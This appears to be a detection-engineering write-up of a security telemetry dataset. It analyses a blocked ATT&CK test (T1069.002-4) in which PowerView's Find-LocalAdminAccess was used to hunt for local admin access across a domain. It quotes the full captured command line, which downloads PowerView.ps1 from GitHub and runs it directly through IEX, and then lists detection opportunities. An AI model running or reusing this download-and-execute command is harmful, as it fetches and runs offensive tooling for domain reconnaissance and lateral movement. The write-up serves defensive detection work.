# T1069.002-4: Domain Groups — Find machines where user has local admin access (PowerView)

## Technique Context

T1069.002 Domain Groups focuses on adversary attempts to discover domain-level group memberships and permissions within Active Directory environments. This specific test simulates using PowerView's `Find-LocalAdminAccess` function to identify machines where the current user has local administrator privileges - a common post-compromise reconnaissance activity. Attackers use this technique to map privilege escalation paths and identify high-value targets for lateral movement. The detection community typically focuses on PowerShell execution patterns, network enumeration behaviors, and the specific API calls that PowerView makes to query domain controllers and remote systems.

## What This Dataset Contains

The dataset captures a PowerShell-based attack attempt that was blocked by Windows Defender. Security event 4688 shows the critical command line execution: `powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose}`. The process exits with status code `0xC0000022` (STATUS_ACCESS_DENIED), indicating Defender blocked execution before PowerView could be loaded or executed.

Sysmon captures substantial telemetry around the PowerShell processes, including Sysmon event 1 for the `whoami.exe` execution, multiple Sysmon event 7 entries showing .NET runtime and PowerShell automation DLLs being loaded, and event 10 showing process access attempts. The data includes three distinct PowerShell process instances (PIDs 38424, 38708, 38932) with associated .NET framework initialization sequences.

PowerShell operational logs contain only test framework boilerplate (`Set-StrictMode`, `Set-ExecutionPolicy Bypass`) with no evidence of the actual PowerView script execution, confirming the technique was blocked before the malicious PowerShell content could execute.

## What This Dataset Does Not Contain

This dataset lacks the actual PowerView execution telemetry because Windows Defender successfully blocked the technique. You won't find network connections to the PowerSploit GitHub repository, DNS queries for the external domain, or any domain enumeration activity that would normally result from successful PowerView execution. There are no LDAP queries, SMB connections to remote systems, or the characteristic API calls that PowerView makes to enumerate local admin access across domain machines.

The Sysmon configuration's include-mode filtering means many benign process creations are absent, focusing telemetry on the suspicious PowerShell activity. The dataset also lacks any successful privilege enumeration results or evidence of the technique's intended outcome.

## Assessment

This dataset provides excellent telemetry for detecting PowerView download attempts and PowerShell-based reconnaissance tools, even when blocked by endpoint protection. The Security event logs capture the full command line containing the PowerSploit GitHub URL and specific PowerView function call, making this highly valuable for signature-based detection. The combination of process creation events, DLL loading patterns, and the distinctive exit code provides multiple detection opportunities.

The Sysmon telemetry effectively captures the PowerShell initialization sequence and process relationships, while the blocked execution demonstrates how modern endpoint protection impacts technique telemetry. For detection engineering, this represents a best-case scenario where the attack vector is clearly visible even though the technique was prevented.

## Detection Opportunities Present in This Data

1. Command line detection for PowerView download patterns - Security 4688 contains the full PowerSploit GitHub URL and `Find-LocalAdminAccess` function call
2. Process exit code monitoring - Security 4689 shows exit status `0xC0000022` indicating access denied/blocked execution
3. PowerShell execution with external script download patterns - combination of `IEX`, `IWR`, and GitHub PowerSploit repository URLs
4. Sysmon process creation (EID 1) detection for `whoami.exe` execution from PowerShell, indicating reconnaissance activity
5. Sysmon process access (EID 10) monitoring for PowerShell processes accessing other system processes with high privileges (`0x1FFFFF`)
6. .NET runtime DLL loading sequences in PowerShell processes indicating script execution preparation
7. Multiple PowerShell process spawning patterns that may indicate automated or scripted execution attempts
8. Windows Defender integration - correlating blocked executions with command line evidence for threat hunting
